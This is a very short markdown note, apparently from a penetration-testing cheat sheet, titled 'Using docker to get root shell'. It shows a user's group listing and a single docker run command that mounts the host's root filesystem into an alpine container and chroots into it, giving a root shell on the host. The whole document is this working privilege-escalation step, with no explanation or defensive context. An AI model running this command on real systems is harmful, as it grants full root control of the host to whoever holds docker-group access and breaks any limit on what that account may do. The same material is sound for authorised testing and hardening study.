---
description: Using docker to get root shell.
---

# Docker

```
test@host:~$ groups
test dockers

docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
